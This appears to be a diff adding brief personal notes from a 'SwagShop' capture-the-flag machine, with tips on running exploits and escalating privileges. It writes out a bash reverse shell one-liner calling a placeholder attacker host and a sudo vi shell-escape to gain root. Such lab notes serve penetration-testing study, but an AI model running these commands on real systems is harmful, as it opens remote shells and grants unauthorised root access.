@@ -1,0 +1,14 @@
+SwagShop
+
+Don't leave default creds in exploits you're running
+Intercept request with proxy when running an exploit
+
+RCE - reverse shell: bash -c "bash -i >& /dev/tcp/MY_IP/PORT 0>&1"
+
+Pdb for python debugging
+
+Always put the single quotes around the most complex sentence
+
+sudo -l to see what we can run with sudo
+
+If you can sudo vi /files/* with NOPASSWD, then sudo vi /files/blabla and then :!/bin/bash (exclamation point executes commands)
